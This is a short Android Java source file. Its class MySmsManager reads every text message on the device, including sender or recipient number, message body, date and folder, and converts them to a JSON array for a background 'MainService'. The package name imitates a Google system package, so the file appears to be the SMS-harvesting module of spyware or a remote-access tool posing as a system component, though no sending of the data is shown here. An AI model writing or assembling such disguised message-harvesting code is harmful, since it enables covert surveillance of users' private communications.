package com.google.android.android;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.Telephony;
import android.widget.Toast;


import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.util.Date;

public class MySmsManager {

    public JSONArray getAllSms() {
        JSONArray allSms = new JSONArray();
        ContentResolver contentResolver = MainService.getInstance().getContentResolver();
        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null);


        if (cursor == null) return allSms;
        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                Date dateFormat= new Date(Long.valueOf(date));
                String type = "unknown";
                switch (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                    case Telephony.Sms.MESSAGE_TYPE_INBOX:
                        type = "inbox";
                        break;
                    case Telephony.Sms.MESSAGE_TYPE_SENT:
                        type = "sent";
                        break;
                    case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                        type = "outbox";
                        break;
                    default:
                        break;
                }

                JSONObject sms = new JSONObject();
                sms.put("type", type);
                sms.put("address", number);
                sms.put("body", body);
                sms.put("date", dateFormat.toString());

                allSms.add(sms);
                cursor.moveToNext();
            }
        }
        return allSms;
    }

}
